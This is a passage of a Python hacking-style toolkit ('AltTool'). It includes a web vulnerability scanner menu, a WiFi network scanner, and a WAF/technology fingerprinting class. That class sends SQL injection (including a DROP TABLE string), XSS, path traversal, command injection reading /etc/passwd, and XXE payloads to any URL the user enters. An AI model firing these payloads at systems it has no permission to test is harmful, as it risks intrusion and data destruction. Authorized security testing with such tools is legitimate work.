            choice = input(f"""{Colors.MAGENTA}
    ┌───({Colors.WHITE}AltWolf@altool{Colors.MAGENTA})─[{Colors.WHITE}~/settings{Colors.MAGENTA}]                    
    └──$  {Colors.WHITE}""").strip()

    def show_settings_menu():
        while True:
            clear_screen()
            scanner = """
                             █████╗ ██╗     ████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
                            ██╔══██╗██║     ╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
                            ███████║██║        ██║       ███████╗██║     ███████║██╔██╗ ██║
                            ██╔══██║██║        ██║       ╚════██║██║     ██╔══██║██║╚██╗██║
                            ██║  ██║███████╗   ██║       ███████║╚██████╗██║  ██║██║ ╚████║
                            ╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
            """
            print_violet_white_gradient(scanner)
            
            by = """
            < [V] 1.9.1                                                     By AltWolf
            < [Creator] Team AltSad                                          AltT00l
            """
            print_violet_white_gradient(by)
            
            print(f"""{Colors.MAGENTA}
    ╔═══════════════════════════ PARAMÈTRES ════════════════════════════╗{Colors.RESET}
    {Colors.WHITE}║                                                                   ║{Colors.RESET}
    {Colors.WHITE}║  Mode Verbose:      {Colors.YELLOW}{str(config.verbose).ljust(46)}{Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║  Mode Silent:       {Colors.YELLOW}{str(config.silent).ljust(46)}{Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║  Threads:           {Colors.YELLOW}{str(config.threads).ljust(46)}{Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║  Timeout:           {Colors.YELLOW}{str(config.timeout).ljust(43)}s  {Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║  Rate Limit:        {Colors.YELLOW}{str(config.rate_limit).ljust(43)}s  {Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║  Proxy:             {Colors.YELLOW}{str(config.proxy or 'None').ljust(46)}{Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║  Format:            {Colors.YELLOW}{config.output_format.ljust(46)}{Colors.WHITE}║{Colors.RESET}
    {Colors.WHITE}║                                                                   ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[1]{Colors.WHITE} > Toggle Verbose                                             ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[2]{Colors.WHITE} > Toggle Silent                                              ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[3]{Colors.WHITE} > Modifier Threads                                           ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[4]{Colors.WHITE} > Modifier Timeout                                           ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[5]{Colors.WHITE} > Modifier Rate Limit                                        ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[6]{Colors.WHITE} > Configurer Proxy                                           ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.CYAN}[7]{Colors.WHITE} > Changer Format (txt/json/html)                             ║{Colors.RESET}
    {Colors.WHITE}║  {Colors.RED}[0]{Colors.WHITE} > Retour                                                     ║{Colors.RESET}
    {Colors.WHITE}║                                                                   ║{Colors.RESET}
    {Colors.MAGENTA}╚═══════════════════════════════════════════════════════════════════╝{Colors.RESET}
            """)
            
            choice = input(f"""{Colors.MAGENTA}
    ┌───({Colors.WHITE}AltWolf@altool{Colors.MAGENTA})─[{Colors.WHITE}~/settings{Colors.MAGENTA}]                    
    └──$  {Colors.WHITE}""").strip()
            
            if choice == '0':
                break
            elif choice == '1':
                config.verbose = not config.verbose
            elif choice == '2':
                config.silent = not config.silent
            elif choice == '3':
                try:
                    threads = int(input("Nombre de threads (1-20): "))
                    if 1 <= threads <= 20:
                        config.threads = threads
                except:
                    pass
            elif choice == '4':
                try:
                    timeout = int(input("Timeout en secondes (5-60): "))
                    if 5 <= timeout <= 60:
                        config.timeout = timeout
                except:
                    pass
            elif choice == '5':
                try:
                    rate = float(input("Rate limit en secondes (0-5): "))
                    if 0 <= rate <= 5:
                        config.rate_limit = rate
                except:
                    pass
            elif choice == '6':
                proxy = input("Proxy (ex: http://127.0.0.1:8080) ou vide: ").strip()
                config.proxy = proxy if proxy else None
            elif choice == '7':
                fmt = input("Format (txt/json/html): ").strip().lower()
                if fmt in ['txt', 'json', 'html']:
                    config.output_format = fmt


    def parse_arguments():
        parser = argparse.ArgumentParser(
            description='Scanner de Vulnérabilités Web',
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""

            """
        )
        
        parser.add_argument('url', nargs='?', help='URL cible à scanner')
        parser.add_argument('-v', '--verbose', action='store_true', help='Mode verbeux')
        parser.add_argument('-s', '--silent', action='store_true', help='Mode silencieux')
        parser.add_argument('-t', '--threads', type=int, default=5, help='Nombre de threads (défaut: 5)')
        parser.add_argument('--timeout', type=int, default=10, help='Timeout des requêtes (défaut: 10s)')
        parser.add_argument('-r', '--rate-limit', type=float, default=0.5, help='Délai entre requêtes (défaut: 0.5s)')
        parser.add_argument('-p', '--proxy', help='Proxy (ex: http://127.0.0.1:8080)')
        parser.add_argument('-f', '--format', choices=['txt', 'json', 'html'], default='txt', help='Format de sortie')
        parser.add_argument('--scan', help='Scanner(s) spécifique(s) (ex: 30,31,32)')
        parser.add_argument('--full', action='store_true', help='Scan complet automatique')
        
        return parser.parse_args()

    def main():
        args = parse_arguments()
        
        if args.url:
            config.verbose = args.verbose
            config.silent = args.silent
            config.threads = args.threads
            config.timeout = args.timeout
            config.rate_limit = args.rate_limit
            config.proxy = args.proxy
            config.output_format = args.format
            
            target_url = args.url
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'https://' + target_url
            
            print_banner()
            print(f"{Colors.GREEN}[+] URL cible: {target_url}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] Configuration: Threads={config.threads}, Timeout={config.timeout}s, Rate={config.rate_limit}s{Colors.RESET}")
            if config.proxy:
                print(f"{Colors.CYAN}[+] Proxy: {config.proxy}{Colors.RESET}")
            
            if args.full:
                run_full_scan(target_url)
                return
            
            if args.scan:
                scan_numbers = [s.strip() for s in args.scan.split(',')]
                for scan_num in scan_numbers:
                    run_scanner(scan_num, target_url)
                return
        
        print_banner()
        
        target_url = input(f"{Colors.CYAN}Entrez l'URL cible (ex: https://example.com): {Colors.RESET}").strip()
        
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
        
        print(f"\n{Colors.GREEN}[+] URL cible: {target_url}{Colors.RESET}")
        
        while True:
            show_main_menu()
            choice = input(f"{Colors.CYAN}Sélectionnez une option: {Colors.RESET}").strip().upper()
            
            if choice == '0':
                print(f"\n{Colors.GREEN}Au revoir!{Colors.RESET}")
                break
            elif choice == 'S':
                show_settings_menu()
                clear_screen()
                print_banner()
                print(f"\n{Colors.GREEN}[+] URL cible: {target_url}{Colors.RESET}")
            elif choice == '99':
                run_full_scan(target_url)
            else:
                run_scanner(choice.lower(), target_url)
            
            if not config.silent:
                input(f"\n{Colors.YELLOW}Appuyez sur Entrée pour continuer...{Colors.RESET}")
            clear_screen()
            print_banner()
            print(f"\n{Colors.GREEN}[+] URL cible: {target_url}{Colors.RESET}")

    if __name__ == "__main__":
        try:
            main()
        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}[!] Scan interrompu par l'utilisateur{Colors.RESET}")
            sys.exit(0)
        except Exception as e:
            print(f"\n{Colors.RED}[!] Erreur: {str(e)}{Colors.RESET}")
            sys.exit(1)



if menu_choice == "26":
    os.system('cls' if os.name == 'nt' else 'clear')
    import subprocess
    import platform
    import re
    import sys
    from collections import defaultdict
    from datetime import datetime
    class WiFiScanner:
        def __init__(self):
            self.os_type = platform.system()
            self.networks = []
            
        def scan_networks_windows(self):
            print("Scanning WiFi networks...\n")
            networks = []
            
            try:
                print("Refreshing network list...")
                subprocess.run(
                    ['netsh', 'wlan', 'show', 'networks'],
                    capture_output=True,
                    timeout=5
                )
                
                result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                if result.returncode != 0:
                    print(f"Command returned error code: {result.returncode}")
                    print(f"Error output: {result.stderr}")
                    return networks
                
                output = result.stdout
                
                lines = output.split('\n')
                current_network = None
                
                for line in lines:
                    line = line.strip()
                    
                    if line.startswith('SSID') and ':' in line and 'BSSID' not in line:
                        if current_network and current_network.get('ssid'):
                            networks.append(current_network)
                        
                        parts = line.split(':', 1)
                        ssid = parts[1].strip() if len(parts) > 1 else ''
                        
                        if ssid:
                            current_network = {
                                'ssid': ssid,
                                'bssid': 'Unknown',
                                'signal': 'Unknown',
                                'channel': 'Unknown',
                                'authentication': 'Unknown',
                                'encryption': 'Unknown'
                            }
                    
                    elif current_network:
                        if 'Network type' in line and ':' in line:
                            current_network['type'] = line.split(':', 1)[1].strip()
                        
                        elif 'Authentication' in line and ':' in line:
                            current_network['authentication'] = line.split(':', 1)[1].strip()
                        
                        elif 'Encryption' in line and ':' in line:
                            current_network['encryption'] = line.split(':', 1)[1].strip()
                        
                        elif 'BSSID' in line and ':' in line:
                            parts = line.split(':', 1)
                            if len(parts) > 1:
                                current_network['bssid'] = parts[1].strip()
                        
                        elif 'Signal' in line and ':' in line:
                            current_network['signal'] = line.split(':', 1)[1].strip()
                        
                        elif 'Channel' in line and ':' in line:
                            current_network['channel'] = line.split(':', 1)[1].strip()
                
                if current_network and current_network.get('ssid'):
                    networks.append(current_network)
                
                print(f"✓ Successfully parsed {len(networks)} networks\n")
                return networks
                
            except subprocess.TimeoutExpired:
                print("Scan timeout - trying alternative method...\n")
                return self.scan_networks_windows_alternative()
            except Exception as e:
                print(f"Error during scan: {e}\n")
                return self.scan_networks_windows_alternative()
        
        def scan_networks_windows_alternative(self):
            networks = []
            try:
                result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'networks'],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                lines = result.stdout.split('\n')
                current_network = None
                
                for line in lines:
                    line = line.strip()
                    
                    if line.startswith('SSID') and ':' in line:
                        if current_network and current_network.get('ssid'):
                            networks.append(current_network)
                        
                        ssid = line.split(':', 1)[1].strip()
                        if ssid:
                            current_network = {
                                'ssid': ssid,
                                'signal': 'Unknown',
                                'channel': 'Unknown',
                                'authentication': 'Unknown'
                            }
                    
                    elif current_network:
                        if 'Signal' in line:
                            current_network['signal'] = line.split(':', 1)[1].strip()
                        elif 'Authentication' in line:
                            current_network['authentication'] = line.split(':', 1)[1].strip()
                
                if current_network and current_network.get('ssid'):
                    networks.append(current_network)
                
                print(f"✓ Alternative scan found {len(networks)} networks\n")
                return networks
                
            except Exception as e:
                print(f"Alternative scan also failed: {e}\n")
                return []
        
        def scan_networks_linux(self):
            print("Scanning WiFi networks...\n")
            networks = []
            
            try:
                result = subprocess.run(
                    ['nmcli', '-t', '-f', 'SSID,SIGNAL,CHAN,SECURITY', 'dev', 'wifi', 'list'],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\n')
                    for line in lines:
                        if line:
                            parts = line.split(':')
                            if len(parts) >= 2:
                                ssid = parts[0] if parts[0] else 'Hidden'
                                networks.append({
                                    'ssid': ssid,
                                    'signal': parts[1] + '%' if len(parts) > 1 else 'Unknown',
                                    'channel': parts[2] if len(parts) > 2 else 'Unknown',
                                    'authentication': parts[3] if len(parts) > 3 else 'Unknown'
                                })
                    
                    print(f"✓ Found {len(networks)} networks\n")
                    return networks
                
            except Exception as e:
                print(f"Error: {e}\n")
            
            return []
        
        def scan_networks_macos(self):
            print("Scanning WiFi networks...\n")
            networks = []
            
            try:
                result = subprocess.run(
                    ['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-s'],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                if result.returncode == 0:
                    lines = result.stdout.split('\n')[1:]
                    
                    for line in lines:
                        if line.strip():
                            parts = line.split()
                            if len(parts) >= 3:
                                networks.append({
                                    'ssid': parts[0],
                                    'signal': parts[2],
                                    'channel': parts[3] if len(parts) > 3 else 'Unknown',
                                    'authentication': ' '.join(parts[6:]) if len(parts) > 6 else 'Unknown'
                                })
                    
                    print(f"✓ Found {len(networks)} networks\n")
                    return networks
                    
            except Exception as e:
                print(f"Error: {e}\n")
            
            return []
        
        def scan(self):
            print(f"Operating System: {self.os_type}")
            
            if self.os_type == "Windows":
                self.networks = self.scan_networks_windows()
            elif self.os_type == "Linux":
                self.networks = self.scan_networks_linux()
            elif self.os_type == "Darwin":
                self.networks = self.scan_networks_macos()
            else:
                print(f"Unsupported OS: {self.os_type}")
                return []
            
            return self.networks
        
        def display_networks(self):
            if not self.networks:
                return
            
            print("DISCOVERED NETWORKS")
            time.sleep(2)
            
            def get_signal_value(net):
                signal = net.get('signal', '0')
                if '%' in signal:
                    match = re.search(r'(\d+)', signal)
                    return int(match.group(1)) if match else 0
                elif 'dBm' in signal or 'dbm' in signal:
                    match = re.search(r'(-?\d+)', signal)
                    return int(match.group(1)) + 100 if match else 0
                return 0
            
            sorted_networks = sorted(self.networks, key=get_signal_value, reverse=True)
            
            print(f"{'#':<4} {'SSID':<30} {'Signal':<15} {'Channel':<10} {'Security':<20}")
            print("-"*80)
            
            for i, net in enumerate(sorted_networks, 1):
                ssid = net.get('ssid', 'Unknown')[:28]
                signal = net.get('signal', 'Unknown')
                channel = str(net.get('channel', 'Unknown'))
                security = net.get('authentication', 'Unknown')[:18]
                
                signal_indicator = ""
                if '%' in signal:
                    match = re.search(r'(\d+)', signal)
                    if match:
                        strength = int(match.group(1))
                        if strength >= 80:
                            signal_indicator = ""
                        elif strength >= 60:
                            signal_indicator = ""
                        elif strength >= 40:
                            signal_indicator = ""
                        else:
                            signal_indicator = ""
                
                print(f"{i:<4} {ssid:<30} {signal_indicator} {signal:<13} {channel:<10} {security:<20}")
            
            print("-"*80)
            print(f"Total: {len(sorted_networks)} networks\n")
        
        def analyze_security(self):
            if not self.networks:
                return
            
            print("="*80)
            print("SECURITY ANALYSIS")
            print("="*80 + "\n")
            
            open_nets = []
            wep_nets = []
            wpa_nets = []
            wpa2_nets = []
            wpa3_nets = []
            
            for net in self.networks:
                auth = net.get('authentication', '').upper()
                enc = net.get('encryption', '').upper()
                ssid = net.get('ssid', 'Unknown')
                
                if 'OPEN' in auth or auth == '' or 'NONE' in enc:
                    open_nets.append(ssid)
                elif 'WPA3' in auth:
                    wpa3_nets.append(ssid)
                elif 'WPA2' in auth:
                    wpa2_nets.append(ssid)
                elif 'WPA' in auth:
                    wpa_nets.append(ssid)
                elif 'WEP' in auth or 'WEP' in enc:
                    wep_nets.append(ssid)
            
            total = len(self.networks)
            
            print(f"Total Networks: {total}")
            print(f"\nOpen Networks (Dangerous): {len(open_nets)}")
            if open_nets:
                for ssid in open_nets[:3]:
                    print(f"   - {ssid}")
            
            print(f"\nWEP Networks (Weak): {len(wep_nets)}")
            print(f"WPA Networks: {len(wpa_nets)}")
            print(f"WPA2 Networks: {len(wpa2_nets)}")
            print(f"WPA3 Networks: {len(wpa3_nets)}")
            
            if total > 0:
                secure = len(wpa2_nets) + len(wpa3_nets)
                score = int((secure / total) * 100)
                print(f"\nSecurity Score: {score}/100")
                
                if score >= 80:
                    print("   Excellent security environment")
                elif score >= 60:
                    print("   Good but could be better")
                else:
                    print("   Many insecure networks detected")
            
            print()
        
        def analyze_channels(self):
            """Analyze channel distribution"""
            if not self.networks:
                return
            
            channels = defaultdict(int)
            
            for net in self.networks:
                channel = str(net.get('channel', 'Unknown'))
                if channel != 'Unknown' and channel.isdigit():
                    channels[channel] += 1
            
            if channels:
                sorted_channels = sorted(channels.items(), key=lambda x: int(x[0]))
                
                print(f"Total Channels in Use: {len(channels)}\n")
                print("Channel Distribution:")
                
                max_count = max(channels.values())
                for ch, count in sorted_channels:
                    bar_length = int((count / max_count) * 40)
                    bar = '' * bar_length
                    print(f"  Ch {ch:>3}: {bar} {count}")
                
                least_used = sorted(channels.items(), key=lambda x: x[1])[:3]
                print(f"\n✓ Recommended Channels (Less Congested):")
                for ch, count in least_used:
                    print(f"  Channel {ch}: {count} network(s)")
            
            print()
        
        def generate_summary(self):
            
            total = len(self.networks)
            unique_ssids = len(set(net.get('ssid', '') for net in self.networks))
            
            print(f"Scan completed successfully!")
            print(f"Total Networks: {total}")
            print(f"Unique SSIDs: {unique_ssids}")
            print(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print("\n" + "="*80 + "\n")


    def main():
        wifi = """
                .....:-----:.....            
            ...-*%@@@@@@@@@@@@@@@%+:...       
        .=%@@@@@@@@@@@@@@@@@@@@@@@@@#-.     
    ..=%@@@@@@@@%*+-:.....:-+#%@@@@@@@@#-.. 
    ..*@@@@@@@%=...............   .+%@@@@@@@=.
    =@@@@@#:.   .=#%@@@@@@@@@%#=.. ..-%@@@@%:
    .=##=.. .=#@@@@@@@@@@@@@@@@@@@*-. ..+#*-. 
        .*@@@@@@@@%#+===*%%@@@@@@@@=..              Wifi Scan By AltWolf - AltSad
        .@@@@@@#-..        ...=@@@@@@*.                    Version V1.0.1
        .-%@%+....:+#%@@@%*=:....*@@%:.     
            ..  .:#@@@@@@@@@@@@@*..  ..       
                =@@@@@@@%%@@@@@@@@-           
                :%@@%-..   ..+%@@#..          
                .... ...:........            
                    .-@@@@%.                 
                    .=@@@@@:                 
                    .-#%#:. 
        """
        print_violet_white_gradient(wifi)
        try:
            scanner = WiFiScanner()
            print("Starting WiFi scan...\n")
            networks = scanner.scan()
            
            if not networks:
                print("\nNo networks found!")
                print("\nTroubleshooting:")
                print("   1. Make sure WiFi is enabled on your device")
                print("   2. Check if WiFi adapter is working properly")
                print("   3. Try running the script again")

            else:
                scanner.display_networks()
                scanner.analyze_security()
                scanner.analyze_channels()
                scanner.generate_summary()
            
        except KeyboardInterrupt:
            print("\n\nScan interrupted by user")
        except Exception as e:
            print(f"\nUnexpected error: {e}")
            import traceback
            traceback.print_exc()

        input("Press ENTER to exit...")


    if __name__ == '__main__':
        main()



if menu_choice == "27":
    os.system('cls' if os.name == 'nt' else 'clear')
    class AdvancedSecurityScanner:
        def __init__(self, url):
            self.url = url if url.startswith('http') else f'https://{url}'
            self.parsed_url = urlparse(self.url)
            self.hostname = self.parsed_url.netloc
            self.findings = {
                'waf': [],
                'security_headers': {},
                'server_info': [],
                'firewall': [],
                'cdn': [],
                'ssl_info': [],
                'technologies': [],
                'cookies': [],
                'dns_info': [],
                'rate_limiting': [],
                'bot_protection': []
            }
            self.session = requests.Session()
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
        def comprehensive_header_scan(self):
            print(f"\n[*] Running comprehensive header analysis...")
            
            try:

                methods = ['GET', 'POST', 'OPTIONS']
                all_headers = {}
                
                for method in methods:
                    try:
                        response = self.session.request(method, self.url, timeout=10, allow_redirects=True)
                        all_headers.update(response.headers)
                    except:
                        pass
                
                waf_signatures = {
                    'Cloudflare': ['cf-ray', 'cf-cache-status', '__cfduid', '__cf_bm', 'cf-request-id'],
                    'AWS WAF': ['x-amzn-requestid', 'x-amzn-trace-id', 'x-amz-cf-id'],
                    'Akamai': ['akamai', 'x-akamai', 'ak-', 'akamai-origin-hop'],
                    'Imperva/Incapsula': ['x-iinfo', 'incap_ses', 'visid_incap', 'incap'],
                    'Sucuri': ['x-sucuri-id', 'x-sucuri-cache', 'sucuri'],
                    'ModSecurity': ['mod_security', 'NOYB'],
                    'F5 BIG-IP': ['f5', 'bigip', 'x-wa-info', 'f5-trace-id'],
                    'Barracuda': ['barra', 'bni__'],
                    'Citrix NetScaler': ['ns_af', 'citrix', 'netscaler'],
                    'FortiWeb': ['fortigate', 'fortiweb'],
                    'Radware': ['x-dfw', 'radware'],
                    'Cloudfront': ['x-amz-cf', 'cloudfront'],
                    'Fastly': ['fastly', 'x-served-by'],
                    'StackPath': ['stackpath'],
                    'DDoS-Guard': ['ddos-guard', 'x-cached-by'],
                    'ChinaCache': ['powered-by-chinacache'],
                    'Varnish': ['x-varnish', 'via.*varnish'],
                    'Reblaze': ['rbzid'],
                    'Wallarm': ['wallarm'],
                    'Wordfence': ['wordfence']
                }
                
                for header, value in all_headers.items():
                    header_lower = header.lower()
                    value_lower = str(value).lower()
                    
                    for waf_name, signatures in waf_signatures.items():
                        for signature in signatures:
                            if signature in header_lower or signature in value_lower:
                                detail = f"{waf_name} - Detected via header '{header}: {value}'"
                                if detail not in self.findings['waf']:
                                    self.findings['waf'].append(detail)

                    security_headers_analysis = {
                        'strict-transport-security': 'HSTS - Forces HTTPS connections',
                        'content-security-policy': 'CSP - Prevents XSS and injection attacks',
                        'x-frame-options': 'Clickjacking protection',
                        'x-content-type-options': 'MIME-sniffing protection',
                        'x-xss-protection': 'XSS filter',
                        'permissions-policy': 'Feature-Policy - Controls browser features',
                        'referrer-policy': 'Controls referrer information',
                        'expect-ct': 'Certificate Transparency',
                        'cross-origin-embedder-policy': 'COEP - Cross-origin isolation',
                        'cross-origin-opener-policy': 'COOP - Cross-origin isolation',
                        'cross-origin-resource-policy': 'CORP - Cross-origin protection'
                    }
                    
                    for sec_header, description in security_headers_analysis.items():
                        if header_lower == sec_header:
                            self.findings['security_headers'][header] = {
                                'value': value,
                                'description': description
                            }
                    
                    tech_headers = ['server', 'x-powered-by', 'x-aspnet-version', 'x-generator', 
                                'x-drupal-cache', 'x-runtime', 'x-version']
                    if header_lower in tech_headers:
                        self.findings['server_info'].append(f"{header}: {value}")

                    cdn_patterns = {
                        'Cloudflare': ['cloudflare', 'cf-'],
                        'Fastly': ['fastly'],
                        'Akamai': ['akamai'],
                        'CloudFront': ['cloudfront', 'x-amz'],
                        'MaxCDN': ['maxcdn'],
                        'KeyCDN': ['keycdn'],
                        'CDN77': ['cdn77'],
                        'BunnyCDN': ['bunnycdn'],
                        'StackPath': ['stackpath'],
                        'Sucuri': ['sucuri']
                    }
                    
                    for cdn, patterns in cdn_patterns.items():
                        for pattern in patterns:
                            if pattern in header_lower or pattern in value_lower:
                                if cdn not in self.findings['cdn']:
                                    self.findings['cdn'].append(f"{cdn} (Header: {header})")
                
                if 'set-cookie' in all_headers:
                    self.findings['cookies'].append(all_headers['set-cookie'])
                
                print(f"[✓] Header analysis complete - {len(all_headers)} headers analyzed")
                
            except Exception as e:
                print(f"[!] Header scan error: {e}")
        
        def aggressive_waf_detection(self):
            print(f"\n[*] Running aggressive WAF detection tests...")
            
            attack_payloads = {
                'SQL Injection': [
                    "?id=1' OR '1'='1",
                    "?id=1 UNION SELECT NULL--",
                    "?id=1'; DROP TABLE users--",
                    "?id=1' AND 1=1--"
                ],
                'XSS': [
                    "?q=<script>alert('XSS')</script>",
                    "?q=<img src=x onerror=alert(1)>",
                    "?search=<svg/onload=alert(1)>",
                    "?input=javascript:alert(1)"
                ],
                'Path Traversal': [
                    "/../../../etc/passwd",
                    "/..\\..\\..\\windows\\system32\\",
                    "?file=../../../../etc/shadow"
                ],
                'Command Injection': [
                    "?cmd=;ls -la",
                    "?exec=| cat /etc/passwd",
                    "?run=`whoami`"
                ],
                'XXE': [
                    "?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"
                ]
            }
            
            waf_detected = False
            detection_details = []
            
            for attack_type, payloads in attack_payloads.items():
                for payload in payloads:
                    try:
                        test_url = self.url + payload
                        response = self.session.get(test_url, timeout=5)
                        
                        waf_responses = {
                            'Cloudflare': ['cloudflare', 'cf-ray', 'attention required', 'ray id'],
                            'Incapsula': ['incapsula', '_incap_', 'request unsuccessful'],
                            'Sucuri': ['sucuri', 'access denied', 'cloudproxy'],
                            'ModSecurity': ['mod_security', '406 not acceptable', 'forbidden'],
                            'F5 BIG-IP': ['the requested url was rejected', 'f5'],
                            'Barracuda': ['barracuda', 'barra'],
                            'FortiWeb': ['fortigate', '.fgd_icon'],
                            'AWS WAF': ['aws', '403 forbidden', 'request blocked'],
                            'Akamai': ['akamai', 'reference #'],
                            'Wordfence': ['wordfence', 'generated by wordfence']
                        }
                        
                        response_text = response.text.lower()
                        
                        if response.status_code in [403, 406, 419, 429, 503, 999]:
                            waf_detected = True
                            detail = f"{attack_type} blocked (Status: {response.status_code})"
                            
                            for waf_name, signatures in waf_responses.items():
                                if any(sig in response_text for sig in signatures):
                                    detail += f" - WAF Identified: {waf_name}"
                                    if detail not in detection_details:
                                        detection_details.append(detail)
                                    break
                            
                            if detail not in detection_details:
                                detection_details.append(detail)
                        
                        for header, value in response.headers.items():
                            for waf_name, signatures in waf_responses.items():
                                if any(sig in header.lower() or sig in str(value).lower() for sig in signatures):
                                    detail = f"WAF confirmed: {waf_name} (Response header)"
                                    if detail not in detection_details:
                                        detection_details.append(detail)
                        
                        time.sleep(0.2) 
                        
                    except requests.exceptions.RequestException as e:
                        if '403' in str(e) or '406' in str(e):
                            waf_detected = True
                            detection_details.append(f"{attack_type} - Connection blocked (Network level filtering)")
                        pass
            
            if waf_detected:
                self.findings['firewall'].extend(detection_details)
                print(f"[✓] WAF detected with {len(detection_details)} positive indicators")
            else:
                self.findings['firewall'].append("No WAF detected (Warning: Site may be vulnerable)")
                print(f"[!] No WAF protection detected")
        
        def bot_protection_detection(self):
            print(f"\n[*] Detecting bot protection systems...")
            
            bot_tests = {
                'reCAPTCHA': ['recaptcha', 'google.com/recaptcha'],
                'hCaptcha': ['hcaptcha', 'hcaptcha.com'],
                'Cloudflare Turnstile': ['turnstile', 'challenges.cloudflare.com'],
                'PerimeterX': ['perimeterx', '_px'],
                'DataDome': ['datadome', '.datadome.co'],
                'Kasada': ['kasada', '492c7e51-2d23-4d5a-9192-8d7fd93b1896'],
                'Shape Security': ['shape-challenge'],
                'Distil Networks': ['distil_'],
                'Reese84': ['reese84']
            }
            
            try:
                response = self.session.get(self.url, timeout=10)
                page_content = response.text.lower()
                
                for bot_protection, signatures in bot_tests.items():
                    if any(sig in page_content for sig in signatures):
                        self.findings['bot_protection'].append(
                            f"{bot_protection} - Active bot protection detected"
                        )
                
                js_challenges = ['checking your browser', 'please wait', 'verifying you are human']
                if any(challenge in page_content for challenge in js_challenges):
                    self.findings['bot_protection'].append(
                        "JavaScript Challenge - Browser verification active"
                    )
                
                print(f"[✓] Bot protection scan complete")
                
            except Exception as e:
                print(f"[!] Bot protection detection error: {e}")
        
        def rate_limiting_test(self):
            print(f"\n[*] Testing for rate limiting...")
            
            try:
                responses = []
                for i in range(15):
                    response = self.session.get(self.url, timeout=5)
                    responses.append(response.status_code)
                    time.sleep(0.1)
                
                if 429 in responses:
                    self.findings['rate_limiting'].append("Rate limiting detected (429 Too Many Requests)")
                elif responses.count(503) > 3:
                    self.findings['rate_limiting'].append("Rate limiting detected (503 Service Unavailable)")
                else:
                    self.findings['rate_limiting'].append("No rate limiting detected in initial tests")
                
                print(f"[✓] Rate limiting test complete")
                
            except Exception as e:
                print(f"[!] Rate limiting test error: {e}")
        
        def advanced_ssl_scan(self):
            print(f"\n[*] Performing advanced SSL/TLS analysis...")
            
            try:
                context = ssl.create_default_context()
                with socket.create_connection((self.hostname, 443), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=self.hostname) as ssock:
                        cert = ssock.getpeercert()
                        
                        self.findings['ssl_info'].append(f"Protocol: {ssock.version()}")
                        self.findings['ssl_info'].append(f"Cipher Suite: {ssock.cipher()[0]}")
                        self.findings['ssl_info'].append(f"Cipher Bits: {ssock.cipher()[2]}")
                        
                        if 'subject' in cert:
                            for item in cert['subject']:
                                for key, value in item:
                                    if key == 'commonName':
                                        self.findings['ssl_info'].append(f"Common Name: {value}")
                                    elif key == 'organizationName':
                                        self.findings['ssl_info'].append(f"Organization: {value}")
                        
                        if 'issuer' in cert:
                            for item in cert['issuer']:
                                for key, value in item:
                                    if key == 'organizationName':
                                        self.findings['ssl_info'].append(f"Certificate Authority: {value}")
                        
                        if 'notAfter' in cert:
                            self.findings['ssl_info'].append(f"Valid Until: {cert['notAfter']}")
                        
           
                        if 'subjectAltName' in cert:
                            san_count = len(cert['subjectAltName'])
                            self.findings['ssl_info'].append(f"Subject Alternative Names: {san_count} domains")
                
                print(f"[✓] SSL/TLS analysis complete")
                        
            except Exception as e:
                self.findings['ssl_info'].append(f"SSL scan failed: {str(e)}")
                print(f"[!] SSL scan error: {e}")
        
        def dns_security_check(self):
            print(f"\n[*] Checking DNS security features...")
            
            try:
                ip_address = socket.gethostbyname(self.hostname)
                self.findings['dns_info'].append(f"IP Address: {ip_address}")
                
          
                try:
                    hostname = socket.gethostbyaddr(ip_address)
                    self.findings['dns_info'].append(f"Reverse DNS: {hostname[0]}")
                except:
                    self.findings['dns_info'].append("Reverse DNS: Not configured")
              
                cdn_ranges = {
                    'Cloudflare': ['104.', '172.', '173.'],
                    'Akamai': ['23.', '96.'],
                    'Fastly': ['151.101.'],
                    'AWS': ['52.', '54.', '18.']
                }
                
                for cdn, ip_prefixes in cdn_ranges.items():
                    if any(ip_address.startswith(prefix) for prefix in ip_prefixes):
                        self.findings['dns_info'].append(f"IP suggests {cdn} infrastructure")
                
                print(f"[✓] DNS security check complete")
                
            except Exception as e:
                print(f"[!] DNS check error: {e}")
        
        def technology_fingerprinting(self):
            print(f"\n[*] Fingerprinting web technologies...")
            
            try:
                response = self.session.get(self.url, timeout=10)
                content = response.text.lower()
                
          
                tech_signatures = {
                    'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
                    'Drupal': ['drupal', 'sites/default'],
                    'Joomla': ['joomla', 'com_content'],
                    'Magento': ['magento', 'mage/cookies'],
                    'Shopify': ['shopify', 'cdn.shopify.com'],
